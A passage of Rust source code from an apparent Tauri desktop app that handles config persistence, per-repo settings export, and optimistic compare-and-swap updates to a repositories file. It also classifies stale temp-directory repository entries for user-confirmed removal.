        // config.json until some unrelated setting happens to be saved.
        //
        // save_app_config_with, not save_app_config_locked: we already hold both
        // the in-process AND the file lock in this scope. save_app_config_locked
        // persists via write_holding_lock, which would call acquire_file_lock a
        // second time from this same process and deadlock.
        if let Err(e) =
            save_app_config_with(config.clone(), |disk_config| file.write_atomic(disk_config))
        {
            tracing::warn!(
                source = "config",
                "Migrated a secret to the vault but could not rewrite config.json: {e}"
            );
        }
    }
    config
}

/// Acquire both locks and replace the complete AppConfig document.
///
/// This is reserved for bootstrap and explicit replacement paths. Interactive config
/// mutation goes through `commit_config_change`, which applies a delta to the latest
/// locked disk value instead of replacing it with a stale snapshot.
pub(crate) fn save_app_config(config: AppConfig) -> Result<(), String> {
    let _guard = config_write_lock();
    save_app_config_locked(config, &_guard)
}

/// Persist `config`. Precondition: the caller MUST already hold `CONFIG_WRITE_LOCK`
/// — enforced by the `&ConfigWriteGuard` parameter.
fn save_app_config_locked(config: AppConfig, guard: &ConfigWriteGuard) -> Result<(), String> {
    save_app_config_with(config, |disk_config| {
        ConfigFile::<AppConfig>::new(APP_CONFIG_FILE).write_holding_lock(guard, disk_config)
    })
}

fn save_app_config_with<F>(config: AppConfig, persist_disk: F) -> Result<(), String>
where
    F: FnOnce(&AppConfig) -> Result<(), String>,
{
    let snapshot = AppSecretSnapshot::capture()?;
    let result = config_for_disk(config).and_then(|disk_config| persist_disk(&disk_config));
    if let Err(primary) = result {
        return match snapshot.restore() {
            Ok(()) => Err(primary),
            Err(rollback) => Err(format!(
                "{primary}; credential rollback also failed: {rollback}"
            )),
        };
    }
    Ok(())
}

// Notification config
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_notification_config() -> NotificationConfig {
    load_json_config(NOTIFICATION_CONFIG_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_notification_config(
    base: NotificationConfig,
    config: NotificationConfig,
) -> Result<(), String> {
    let file: ConfigFile<NotificationConfig> = ConfigFile::new(NOTIFICATION_CONFIG_FILE);
    file.save_delta(&base, &config)
}

// UI prefs
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_ui_prefs() -> UIPrefsConfig {
    load_json_config(UI_PREFS_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_ui_prefs(base: UIPrefsConfig, config: UIPrefsConfig) -> Result<(), String> {
    let file: ConfigFile<UIPrefsConfig> = ConfigFile::new(UI_PREFS_FILE);
    file.save_delta(&base, &config)
}

// Repo settings
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_repo_settings() -> RepoSettingsMap {
    load_json_config(REPO_SETTINGS_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_repo_settings(
    base: RepoSettingsMap,
    config: RepoSettingsMap,
) -> Result<(), String> {
    let file: ConfigFile<RepoSettingsMap> = ConfigFile::new(REPO_SETTINGS_FILE);
    file.save_delta(&base, &config)
}

/// Set or clear a human-readable label for a branch/worktree within a repo.
/// `label = None` removes the label. Idempotent; no-ops on unknown repo paths.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn set_branch_label(
    repo_path: String,
    branch_name: String,
    label: Option<String>,
) -> Result<(), String> {
    let file: ConfigFile<RepoSettingsMap> = ConfigFile::new(REPO_SETTINGS_FILE);
    file.update(|settings| {
        let Some(entry) = settings.repos.get_mut(&repo_path) else {
            return false;
        };
        match &label {
            Some(l) if !l.trim().is_empty() => {
                entry
                    .branch_labels
                    .insert(branch_name.clone(), l.trim().to_string());
            }
            _ => {
                entry.branch_labels.remove(&branch_name);
            }
        }
        true
    })
}

/// Remove a branch label — called by worktree deletion to keep config tidy.
pub(crate) fn remove_branch_label(repo_path: &str, branch_name: &str) {
    let file: ConfigFile<RepoSettingsMap> = ConfigFile::new(REPO_SETTINGS_FILE);
    let result = file.update(|settings| {
        settings
            .repos
            .get_mut(repo_path)
            .is_some_and(|entry| entry.branch_labels.remove(branch_name).is_some())
    });
    if let Err(e) = result {
        tracing::warn!("Failed to save config after removing branch label: {e}");
    }
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn check_has_custom_settings(path: String) -> bool {
    let settings: RepoSettingsMap = load_json_config(REPO_SETTINGS_FILE);
    settings
        .repos
        .get(&path)
        .is_some_and(|entry| entry.has_custom_settings())
}

// Repo local config (.tuic.json in repo root)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_repo_local_config(repo_path: String) -> Option<RepoLocalConfig> {
    load_repo_local_config_from_path(std::path::Path::new(&repo_path))
}

/// Overlay a repo's per-repo overrides onto an existing `.tuic.json` config.
/// Only fields the user explicitly set per-repo (`Some`) are copied; `None`
/// (inherit-from-global) leaves any existing value in `base` untouched, so the
/// committed file stays a sparse, intentional set of choices. Script fields are
/// never copied — `RepoLocalConfig` has none (repo-committed scripts are unsafe
/// to run without a trust prompt).
/// Fill the team-shareable worktree/branch fields of a `RepoLocalConfig` with
/// the global defaults wherever the config doesn't already specify them.
///
/// Used when exporting `.tuic.json` so teammates inherit the user's *effective*
/// settings, not just the (usually empty) set of per-repo overrides. Fields the
/// config already specifies (e.g. a manually-set `.tuic.json` value) are left
/// untouched, and `mcp_upstreams` is never populated from defaults (it has none).
fn fill_repo_local_defaults(
    mut base: RepoLocalConfig,
    defaults: &RepoDefaultsConfig,
) -> RepoLocalConfig {
    if base.base_branch.is_none() {
        base.base_branch = Some(defaults.base_branch.clone());
    }
    if base.copy_ignored_files.is_none() {
        base.copy_ignored_files = Some(defaults.copy_ignored_files);
    }
    if base.copy_untracked_files.is_none() {
        base.copy_untracked_files = Some(defaults.copy_untracked_files);
    }
    if base.worktree_storage.is_none() {
        base.worktree_storage = Some(defaults.worktree_storage.clone());
    }
    if base.delete_branch_on_remove.is_none() {
        base.delete_branch_on_remove = Some(defaults.delete_branch_on_remove);
    }
    if base.auto_archive_merged.is_none() {
        base.auto_archive_merged = Some(defaults.auto_archive_merged);
    }
    if base.orphan_cleanup.is_none() {
        base.orphan_cleanup = Some(defaults.orphan_cleanup.clone());
    }
    if base.pr_merge_strategy.is_none() {
        base.pr_merge_strategy = Some(defaults.pr_merge_strategy.clone());
    }
    if base.after_merge.is_none() {
        base.after_merge = Some(defaults.after_merge.clone());
    }
    if base.auto_delete_on_pr_close.is_none() {
        base.auto_delete_on_pr_close = Some(defaults.auto_delete_on_pr_close.clone());
    }
    base
}

fn overlay_repo_local_config(
    mut base: RepoLocalConfig,
    entry: &RepoSettingsEntry,
) -> RepoLocalConfig {
    if entry.base_branch.is_some() {
        base.base_branch = entry.base_branch.clone();
    }
    if entry.copy_ignored_files.is_some() {
        base.copy_ignored_files = entry.copy_ignored_files;
    }
    if entry.copy_untracked_files.is_some() {
        base.copy_untracked_files = entry.copy_untracked_files;
    }
    if entry.worktree_storage.is_some() {
        base.worktree_storage = entry.worktree_storage.clone();
    }
    if entry.delete_branch_on_remove.is_some() {
        base.delete_branch_on_remove = entry.delete_branch_on_remove;
    }
    if entry.auto_archive_merged.is_some() {
        base.auto_archive_merged = entry.auto_archive_merged;
    }
    if entry.orphan_cleanup.is_some() {
        base.orphan_cleanup = entry.orphan_cleanup.clone();
    }
    if entry.pr_merge_strategy.is_some() {
        base.pr_merge_strategy = entry.pr_merge_strategy.clone();
    }
    if entry.after_merge.is_some() {
        base.after_merge = entry.after_merge.clone();
    }
    if entry.auto_delete_on_pr_close.is_some() {
        base.auto_delete_on_pr_close = entry.auto_delete_on_pr_close.clone();
    }
    if entry.mcp_upstreams.is_some() {
        base.mcp_upstreams = entry.mcp_upstreams.clone();
    }
    base
}

/// Write the repo's per-repo UI settings into `.tuic.json` at its root so they
/// can be committed and shared with the team. Preserves any existing `.tuic.json`
/// values for fields left as inherit-from-global.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_repo_local_config(repo_path: String) -> Result<(), String> {
    let dir = std::path::Path::new(&repo_path);
    let entry = load_repo_settings().repos.remove(&repo_path);
    // Start from the existing .tuic.json so manually-set fields (e.g. mcp_upstreams) survive.
    let base = load_repo_local_config_from_path(dir).unwrap_or_default();
    // Fill worktree/branch fields with global defaults so the export captures the
    // user's effective settings, not just the (usually empty) per-repo overrides —
    // otherwise a user who relies on global defaults exports an empty {} file.
    let base = fill_repo_local_defaults(base, &load_repo_defaults());
    // Per-repo overrides win over both .tuic.json and global defaults.
    let merged = match entry.as_ref() {
        Some(e) => overlay_repo_local_config(base, e),
        None => base,
    };
    let json = serde_json::to_string_pretty(&merged).map_err(|e| e.to_string())?;
    let file = dir.join(REPO_LOCAL_CONFIG_FILE);
    persist_atomic(&file, json.as_bytes())
        .map_err(|e| format!("Failed to write {}: {e}", file.display()))?;
    Ok(())
}

// Repo defaults (global defaults for all repos)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_repo_defaults() -> RepoDefaultsConfig {
    load_json_config(REPO_DEFAULTS_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_repo_defaults(
    base: RepoDefaultsConfig,
    config: RepoDefaultsConfig,
) -> Result<(), String> {
    let file: ConfigFile<RepoDefaultsConfig> = ConfigFile::new(REPO_DEFAULTS_FILE);
    file.save_delta(&base, &config)
}

/// Resolve the effective setup script for a repo using the three-tier hierarchy:
/// per-repo override > global defaults. Returns `None` if the resolved script is empty.
pub(crate) fn resolve_effective_setup_script(repo_path: &str) -> Option<String> {
    let settings: RepoSettingsMap = load_json_config(REPO_SETTINGS_FILE);
    let defaults: RepoDefaultsConfig = load_json_config(REPO_DEFAULTS_FILE);
    resolve_setup_script_from(&settings, &defaults, repo_path)
}

fn resolve_setup_script_from(
    settings: &RepoSettingsMap,
    defaults: &RepoDefaultsConfig,
    repo_path: &str,
) -> Option<String> {
    if let Some(Some(script)) = settings.repos.get(repo_path).map(|e| &e.setup_script) {
        return if script.is_empty() {
            None
        } else {
            Some(script.clone())
        };
    }
    if !defaults.setup_script.is_empty() {
        return Some(defaults.setup_script.clone());
    }
    None
}

// Repositories (opaque JSON — schema owned by frontend)

const REPOSITORY_MUTATION_VERSION: u8 = 1;

/// One optimistic mutation of an ID-keyed JSON record. `None` means the record
/// did not exist (`before`) or must be removed (`after`). The expectation is
/// checked while holding the cross-process file lock, so a stale client can
/// never overwrite a concurrent edit to the same repository/group silently.
#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct KeyedRepositoryMutation {
    id: String,
    before: Option<serde_json::Value>,
    after: Option<serde_json::Value>,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct RepositoryFieldMutation {
    before: serde_json::Value,
    after: serde_json::Value,
}

/// Delta protocol carried inside the existing `save_repositories(config)`
/// argument and `PUT /config/repositories` body. Keeping the existing command
/// and route means desktop IPC and browser HTTP use the exact same contract.
#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct RepositoryMutationBatch {
    mutation_version: u8,
    #[serde(default)]
    repos: Vec<KeyedRepositoryMutation>,
    #[serde(default)]
    groups: Vec<KeyedRepositoryMutation>,
    #[serde(default)]
    repo_order: Option<RepositoryFieldMutation>,
    #[serde(default)]
    active_repo_path: Option<RepositoryFieldMutation>,
    #[serde(default)]
    group_order: Option<RepositoryFieldMutation>,
}

#[derive(Debug)]
pub(crate) enum RepositorySaveError {
    Conflict(String),
    Invalid(String),
    Io(String),
}

impl std::fmt::Display for RepositorySaveError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Conflict(message) => write!(f, "repository configuration conflict: {message}"),
            Self::Invalid(message) => write!(f, "invalid repository mutation: {message}"),
            Self::Io(message) => write!(f, "{message}"),
        }
    }
}

fn json_option_eq(
    current: Option<&serde_json::Value>,
    expected: &Option<serde_json::Value>,
) -> bool {
    match (current, expected) {
        (None, None) => true,
        (Some(current), Some(expected)) => current == expected,
        _ => false,
    }
}

fn validate_keyed_value(
    collection: &str,
    id: &str,
    value: &Option<serde_json::Value>,
) -> Result<(), RepositorySaveError> {
    let Some(value) = value else {
        return Ok(());
    };
    let object = value.as_object().ok_or_else(|| {
        RepositorySaveError::Invalid(format!("{collection} record '{id}' must be an object"))
    })?;
    let identity_field = if collection == "repos" { "path" } else { "id" };
    if let Some(identity) = object.get(identity_field).and_then(|value| value.as_str())
        && identity != id
    {
        return Err(RepositorySaveError::Invalid(format!(
            "{collection} record '{id}' carries mismatched {identity_field} '{identity}'"
        )));
    }
    Ok(())
}

/// Branch fields a window caches rather than intends: every client recomputes
/// them from the repository itself, on its own refresh cadence.
///
/// They must not take part in the compare-and-swap. A repo under active work
/// changes its diffstat every few seconds, so two windows legitimately hold two
/// different values at the same instant, and asserting equality on them turns
/// every save into a conflict. Measured 2026-08-31: `ego` went 331 -> 357
/// additions in 70 seconds while 29 consecutive saves were rejected, wedging
/// unrelated intent — registering a repository — behind a number nobody edited.
const DERIVED_BRANCH_FIELDS: [&str; 6] = [
    "additions",
    "deletions",
    "isMerged",
    "lastActiveTerminal",
    "lastCommitTs",
    "lifecycleStatus",
];

/// Both keys a repository record can hold its entries under.
///
/// `workspaces` is what every client writes once the identity migration has run;
/// `branches` is what a document written before workspaces existed still holds,
/// and it survives on disk until that repo's first save. Both are stripped, so
/// the comparison behaves identically on either side of the migration — a
/// document is only ever under one of them, so this is one path, not two.
const REPOSITORY_ENTRY_KEYS: [&str; 2] = ["workspaces", "branches"];

/// A repository record with `DERIVED_BRANCH_FIELDS` removed, for the conflict
/// comparison only. Records without entries come back unchanged, so this is
/// safe to apply to any repo record shape.
fn repository_intent_view(value: &Option<serde_json::Value>) -> Option<serde_json::Value> {
    let mut record = value.clone()?;
    for key in REPOSITORY_ENTRY_KEYS {
        let Some(entries) = record.get_mut(key).and_then(|b| b.as_object_mut()) else {
            continue;
        };
        for entry in entries.values_mut() {
            if let Some(fields) = entry.as_object_mut() {
                for name in DERIVED_BRANCH_FIELDS {
                    fields.remove(name);
                }
            }
        }
    }
    Some(record)
}

/// Does `current` still hold what this client expected to overwrite?
///
/// Deliberately weaker than equality for repos: a derived field that drifted
/// under us is not a competing edit. Renames, ordering, grouping and every other
/// field a human sets stay fully guarded.
fn matches_expected_record(
    collection: &str,
    current: Option<&serde_json::Value>,
    expected: &Option<serde_json::Value>,
) -> bool {
    if collection != "repos" {
        return json_option_eq(current, expected);
    }
    repository_intent_view(&current.cloned()) == repository_intent_view(expected)
}

fn apply_keyed_repository_mutations(
    document: &mut serde_json::Map<String, serde_json::Value>,
    collection: &str,
    mutations: &[KeyedRepositoryMutation],
) -> Result<bool, RepositorySaveError> {
    if mutations.is_empty() {
        return Ok(false);
    }

    let records = document
        .entry(collection.to_string())
        .or_insert_with(|| serde_json::Value::Object(serde_json::Map::new()))
        .as_object_mut()
        .ok_or_else(|| RepositorySaveError::Invalid(format!("'{collection}' must be an object")))?;
    let mut seen = std::collections::HashSet::new();
    let mut changed = false;

    for mutation in mutations {
        if mutation.id.is_empty() {
            return Err(RepositorySaveError::Invalid(format!(
                "{collection} record id must not be empty"
            )));
        }
        if !seen.insert(mutation.id.as_str()) {
            return Err(RepositorySaveError::Invalid(format!(
                "duplicate {collection} mutation for '{}'",
                mutation.id
            )));
        }
        validate_keyed_value(collection, &mutation.id, &mutation.before)?;
        validate_keyed_value(collection, &mutation.id, &mutation.after)?;

        let current = records.get(&mutation.id);
        // Exact on purpose: a change confined to derived fields is still a change
        // worth writing, so the cache keeps moving. It just may no longer manufacture
        // a conflict below.
        if json_option_eq(current, &mutation.after) {
            continue;
        }
        if !matches_expected_record(collection, current, &mutation.before) {
            let kind = if collection == "repos" {
                "repository"
            } else {
                "group"
            };
            return Err(RepositorySaveError::Conflict(format!(
                "{kind} '{}' changed in another window; reload before retrying",
                mutation.id
            )));
        }

        match &mutation.after {
            Some(after) => {
                records.insert(mutation.id.clone(), after.clone());
            }
            None => {
                records.remove(&mutation.id);
            }
        }
        changed = true;
    }

    Ok(changed)
}

fn string_order(
    value: &serde_json::Value,
    field: &str,
) -> Result<Vec<String>, RepositorySaveError> {
    serde_json::from_value(value.clone()).map_err(|_| {
        RepositorySaveError::Invalid(format!(
            "'{field}' before/after values must be string arrays"
        ))
    })
}

fn filtered_order(order: &[String], keep: &std::collections::HashSet<&str>) -> Vec<String> {
    order
        .iter()
        .filter(|id| keep.contains(id.as_str()))
        .cloned()
        .collect()
}

fn reordered_relative_to(base: &[String], other: &[String]) -> bool {
    let other_ids: std::collections::HashSet<&str> = other.iter().map(String::as_str).collect();
    let base_ids: std::collections::HashSet<&str> = base.iter().map(String::as_str).collect();
    filtered_order(base, &other_ids) != filtered_order(other, &base_ids)
}

/// Apply only membership changes from `before -> after` to an independently
/// ordered list. New IDs are inserted beside the nearest surviving neighbour
/// from `after`; if there is no common anchor they append deterministically.
fn apply_order_membership_delta(result: &mut Vec<String>, before: &[String], after: &[String]) {
    result.retain(|id| !before.contains(id) || after.contains(id));

    for (index, id) in after.iter().enumerate() {
        if before.contains(id) || result.contains(id) {
            continue;
        }

        let previous = after[..index]
            .iter()
            .rev()
            .find_map(|candidate| result.iter().position(|existing| existing == candidate));
        if let Some(previous) = previous {
            result.insert(previous + 1, id.clone());
            continue;
        }

        let next = after[index + 1..]
            .iter()
            .find_map(|candidate| result.iter().position(|existing| existing == candidate));
        if let Some(next) = next {
            result.insert(next, id.clone());
        } else {
            result.push(id.clone());
        }
    }
}

/// Three-way merge for `repoOrder`/`groupOrder`. Independent additions and
/// removals compose. Two clients that reorder the same pre-existing IDs must
/// agree on their relative order; otherwise the caller receives a conflict.
fn merge_repository_order(
    field: &str,
    before: &[String],
    after: &[String],
    current: &[String],
) -> Result<Vec<String>, RepositorySaveError> {
    if current == before || current == after {
        return Ok(if current == before {
            after.to_vec()
        } else {
            current.to_vec()
        });
    }

    let client_reordered = reordered_relative_to(before, after);
    let concurrent_reordered = reordered_relative_to(before, current);
    if client_reordered && concurrent_reordered {
        let common: std::collections::HashSet<&str> = before
            .iter()
            .filter(|id| after.contains(id) && current.contains(id))
            .map(String::as_str)
            .collect();
        if filtered_order(after, &common) != filtered_order(current, &common) {
            return Err(RepositorySaveError::Conflict(format!(
                "{field} was reordered differently in another window; reload before retrying"
            )));
        }
    }

    let mut merged = if client_reordered && !concurrent_reordered {
        let mut desired = after.to_vec();
        apply_order_membership_delta(&mut desired, before, current);
        desired
    } else {
        let mut latest = current.to_vec();
        apply_order_membership_delta(&mut latest, before, after);
        latest
    };
    // Old files may already contain duplicate order entries. Do not propagate
    // them into a newly merged result, but preserve first-occurrence order.
    let mut seen = std::collections::HashSet::new();
    merged.retain(|id| seen.insert(id.clone()));
    Ok(merged)
}

fn apply_order_mutation(
    document: &mut serde_json::Map<String, serde_json::Value>,
    field: &str,
    mutation: &Option<RepositoryFieldMutation>,
) -> Result<bool, RepositorySaveError> {
    let Some(mutation) = mutation else {
        return Ok(false);
    };
    let before = string_order(&mutation.before, field)?;
    let after = string_order(&mutation.after, field)?;
    let current = document
        .get(field)
        .map(|value| string_order(value, field))
        .transpose()?
        .unwrap_or_default();
    let merged = merge_repository_order(field, &before, &after, &current)?;
    if merged == current {
        return Ok(false);
    }
    document.insert(field.to_string(), serde_json::json!(merged));
    Ok(true)
}

fn valid_active_repo_path(value: &serde_json::Value) -> bool {
    value.is_null() || value.as_str().is_some()
}

fn apply_active_repository_mutation(
    document: &mut serde_json::Map<String, serde_json::Value>,
    mutation: &Option<RepositoryFieldMutation>,
) -> Result<bool, RepositorySaveError> {
    let Some(mutation) = mutation else {
        return Ok(false);
    };
    if !valid_active_repo_path(&mutation.before) || !valid_active_repo_path(&mutation.after) {
        return Err(RepositorySaveError::Invalid(
            "'activeRepoPath' before/after values must be a string or null".to_string(),
        ));
    }
    let current = document
        .get("activeRepoPath")
        .cloned()
        .unwrap_or(serde_json::Value::Null);
    if current == mutation.after {
        return Ok(false);
    }
    if current != mutation.before {
        return Err(RepositorySaveError::Conflict(
            "active repository changed in another window; reload before retrying".to_string(),
        ));
    }
    document.insert("activeRepoPath".to_string(), mutation.after.clone());
    Ok(true)
}

fn apply_repository_mutation_batch(
    value: &mut serde_json::Value,
    batch: &RepositoryMutationBatch,
) -> Result<bool, RepositorySaveError> {
    if batch.mutation_version != REPOSITORY_MUTATION_VERSION {
        return Err(RepositorySaveError::Invalid(format!(
            "unsupported mutationVersion {}",
            batch.mutation_version
        )));
    }
    if value.is_null() {
        *value = serde_json::Value::Object(serde_json::Map::new());
    }
    let document = value.as_object_mut().ok_or_else(|| {
        RepositorySaveError::Invalid("repositories.json root must be an object".to_string())
    })?;

    let mut changed = false;
    changed |= apply_keyed_repository_mutations(document, "repos", &batch.repos)?;
    changed |= apply_keyed_repository_mutations(document, "groups", &batch.groups)?;
    changed |= apply_order_mutation(document, "repoOrder", &batch.repo_order)?;
    changed |= apply_active_repository_mutation(document, &batch.active_repo_path)?;
    changed |= apply_order_mutation(document, "groupOrder", &batch.group_order)?;
    Ok(changed)
}

fn repository_file() -> PathBuf {
    config_dir().join(REPOSITORIES_FILE)
}

/// Paths of the registered repositories: the keys of the `repos` map (the single
/// owner of that shape is `repositories.json`, see `src/stores/repositories.ts`).
pub(crate) fn registered_repo_paths() -> Vec<String> {
    load_repositories()
        .get("repos")
        .and_then(|r| r.as_object())
        .map(|obj| obj.keys().cloned().collect())
        .unwrap_or_default()
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_repositories() -> serde_json::Value {
    load_json_config_from_path(&repository_file())
}

/// Apply a repository mutation delta.
///
/// `Ok(true)` means the document actually moved and was written; `Ok(false)` means
/// the delta was already applied, so disk is untouched. Callers use that to decide
/// whether to announce `repositories-changed` — a no-op save must not wake every
/// other client.
pub(crate) fn save_repositories_request(
    config: serde_json::Value,
) -> Result<bool, RepositorySaveError> {
    let batch: RepositoryMutationBatch = serde_json::from_value(config).map_err(|error| {
        RepositorySaveError::Invalid(format!("could not decode delta: {error}"))
    })?;
    let file: ConfigFile<serde_json::Value> = ConfigFile::at_path(repository_file());
    let mut mutation_error = None;
    let result =
        file.update_with_strict(
            |value| match apply_repository_mutation_batch(value, &batch) {
                Ok(changed) => Ok((changed, changed)),
                Err(error) => {
                    mutation_error = Some(error);
                    Err("repository mutation rejected".to_string())
                }
            },
        );
    match (result, mutation_error) {
        (Ok(changed), _) => Ok(changed),
        (Err(_), Some(error)) => Err(error),
        (Err(error), None) => Err(RepositorySaveError::Io(error)),
    }
}

/// Desktop IPC twin of `PUT /config/repositories`.
///
/// Takes `AppState` only to announce the write: one backend serves the desktop
/// WebView, the browser and the PWA at once, and until this event existed a
/// successful save told the other clients nothing, so their compare-and-swap
/// baseline stayed stale until a conflict taught them otherwise.
#[cfg(feature = "desktop")]
#[tauri::command]
pub(crate) fn save_repositories(
    state: tauri::State<'_, std::sync::Arc<crate::state::AppState>>,
    config: serde_json::Value,
) -> Result<(), String> {
    let changed = save_repositories_request(config).map_err(|error| error.to_string())?;
    if changed {
        state.notify_repositories_changed();
    }
    Ok(())
}

#[cfg(test)]
pub(crate) fn replace_repositories_for_test(config: serde_json::Value) -> Result<(), String> {
    ConfigFile::<serde_json::Value>::at_path(repository_file()).save(&config)
}

/// Roots this project's own tooling and agent worktrees have been observed
/// writing throwaway shell-repo rows under — story 763-d219's live evidence:
/// 15 ghost rows under macOS temp roots and `$HOME/Gits/.tmp`. Deliberately a
/// fixed, narrow allowlist: a path outside these roots never qualifies as a
/// stale-temp candidate no matter how empty the rest of its record looks,
/// because a legitimate repository that is merely offline, unmounted, or on a
/// different drive must survive the classifier unchanged.
fn recognized_temp_roots() -> Vec<PathBuf> {
    let mut roots = vec![std::env::temp_dir()];
    for root in [
        "/tmp",
        "/private/tmp",
        "/var/folders",
        "/private/var/folders",
    ] {
        roots.push(PathBuf::from(root));
    }
    if let Some(home) = dirs::home_dir() {
        roots.push(home.join("Gits").join(".tmp"));
    }
    roots
}

/// `Path::starts_with` compares path COMPONENTS, so it does not collapse a
/// `..` the way the filesystem would: `/tmp/../legit`'s components are
/// `[RootDir, "tmp", ParentDir, "legit"]`, and that sequence still literally
/// starts with `[RootDir, "tmp"]` even though the path it names is `/legit`,
/// entirely outside any temp root. The candidate path never exists on disk
/// (that is the first classifier check), so it cannot be `canonicalize`d to
/// resolve the traversal honestly — refusing to classify any path containing
/// a `..` component is the only safe answer, not a false negative to worry
/// about: a legitimate repository's registered path is never written with a
/// literal `..` in it in the first place.
fn is_under_recognized_temp_root(path: &str) -> bool {
    let candidate = PathBuf::from(path);
    if candidate
        .components()
        .any(|c| matches!(c, std::path::Component::ParentDir))
    {
        return false;
    }
    recognized_temp_roots()
        .iter()
        .any(|root| !root.as_os_str().is_empty() && candidate.starts_with(root))
}

/// One candidate the classifier found — enough for the frontend to preview
/// and name the exact scope before the user confirms a repair (see
/// `repair_stale_temp_repositories_request`, which re-validates every path
/// named here against the document on disk before touching anything).
#[derive(Debug, Clone, Serialize)]
pub(crate) struct StaleTempCandidate {
    pub(crate) path: String,
    #[serde(rename = "displayName")]
    pub(crate) display_name: String,
}

fn json_is_absent_or_empty_array(value: Option<&serde_json::Value>) -> bool {
    match value {
        None => true,
        Some(serde_json::Value::Null) => true,
        Some(serde_json::Value::Array(a)) => a.is_empty(),
        Some(_) => false,
    }
}

fn json_is_present_non_null(value: Option<&serde_json::Value>) -> bool {
    !matches!(value, None | Some(serde_json::Value::Null))
}

fn metadata_error_proves_missing(error: &std::io::Error) -> bool {
    error.kind() == std::io::ErrorKind::NotFound
}

/// A repository record classifies as a "stale-temp" ghost only when ALL of the
/// following hold — this mirrors the live-evidence shape of the 15 ghost rows
/// exactly, and is intentionally an ALL-of test rather than a heuristic score:
/// a record failing even one check is left alone, so a legitimate repository
/// entry (offline, unmounted, or simply not yet reconnected) always survives.
///
/// 1. The local path does not exist.
/// 2. The path falls under a [`recognized_temp_roots`] root.
/// 3. `isGitRepo` is explicitly `false` (never merely absent/true).
/// 4. There is exactly one workspace, and it is shell-only: no live or saved
///    terminals, no last-active terminal, no diffstat/commit/merge state, no
///    parent, no run command, no CI auto-heal.
/// 5. The repository carries no user metadata: default UI booleans
///    (`collapsed`/`parked` false), and no `connectionId`/`initials`.
fn classify_stale_temp_repo(path: &str, repo: &serde_json::Value) -> Option<StaleTempCandidate> {
    let obj = repo.as_object()?;

    match std::fs::metadata(path) {
        Ok(_) => return None, // local path exists — never a candidate.
        Err(error) if metadata_error_proves_missing(&error) => {}
        Err(_) => return None, // permission/I/O uncertainty is not proof of absence.
    }
    if !is_under_recognized_temp_root(path) {
        return None;
    }
    if obj.get("isGitRepo").and_then(|v| v.as_bool()) != Some(false) {
        return None;
    }

    let workspaces = obj.get("workspaces")?.as_object()?;
    if workspaces.len() != 1 {
        return None;
    }
    let (_, workspace) = workspaces.iter().next()?;
    let ws = workspace.as_object()?;

    // Require the workspace to say EXPLICITLY that it is shell-only — absent
    // or `false` both survive. `isShell` is the one positive signal the
    // classifier has that a workspace was never a real checkout; every other
    // check here is a negative absence test, so this one stays strict on
    // purpose rather than defaulting an unmarked record into "probably fine".
    if ws.get("isShell").and_then(|v| v.as_bool()) != Some(true) {
        return None;
    }
    if !json_is_absent_or_empty_array(ws.get("terminals")) {
        return None;
    }
    if !json_is_absent_or_empty_array(ws.get("savedTerminals")) {
        return None;
    }
    if json_is_present_non_null(ws.get("lastActiveTerminal")) {
        return None;
    }
    if json_is_present_non_null(ws.get("parentRepoPath")) {
        return None;
    }
    if json_is_present_non_null(ws.get("runCommand")) {
        return None;
    }
    if json_is_present_non_null(ws.get("ciAutoHeal")) {
        return None;
    }
    if json_is_present_non_null(ws.get("lastCommitTs")) {
        return None;
    }
    let additions = ws.get("additions").and_then(|v| v.as_i64()).unwrap_or(0);
    let deletions = ws.get("deletions").and_then(|v| v.as_i64()).unwrap_or(0);
    if additions != 0 || deletions != 0 {
        return None;
    }
    if ws.get("isMerged").and_then(|v| v.as_bool()) == Some(true) {
        return None;
    }

    if obj.get("collapsed").and_then(|v| v.as_bool()) == Some(true) {
        return None;
    }
    if obj.get("parked").and_then(|v| v.as_bool()) == Some(true) {
        return None;
    }
    if json_is_present_non_null(obj.get("connectionId")) {
        return None;
    }
    if obj
        .get("initials")
        .and_then(|v| v.as_str())
        .is_some_and(|s| !s.is_empty())
    {
        return None;
    }

    let display_name = obj
        .get("displayName")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
        .unwrap_or(path)
        .to_string();
    Some(StaleTempCandidate {
        path: path.to_string(),
        display_name,
    })
}

fn classify_all_stale_temp_repos(document: &serde_json::Value) -> Vec<StaleTempCandidate> {
    let Some(repos) = document.get("repos").and_then(|v| v.as_object()) else {
        return Vec::new();
    };
    let mut candidates: Vec<StaleTempCandidate> = repos
        .iter()
        .filter_map(|(path, repo)| classify_stale_temp_repo(path, repo))
        .collect();
    candidates.sort_by(|a, b| a.path.cmp(&b.path));
    candidates
}

/// Preview the exact scope a repair would touch, without mutating anything.
/// Reads `repositories.json` fresh from disk so the preview always reflects
/// the current document, whichever client last wrote it.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn list_stale_temp_repository_candidates() -> Vec<StaleTempCandidate> {
    classify_all_stale_temp_repos(&load_repositories())
}

/// What a repair actually did — named exactly, so a caller (and its tests)
/// can assert on the scope rather than trust a bare success flag.
#[derive(Debug, Clone, Serialize)]
pub(crate) struct StaleTempRepairSummary {
    pub(crate) removed: Vec<String>,
    #[serde(rename = "backupPath")]
    pub(crate) backup_path: String,
}

/// User-explicit repair: remove exactly the rows named in `paths`, and only
/// those rows, from `repositories.json` — never an implicit/global sweep of
/// every non-existent path.
///
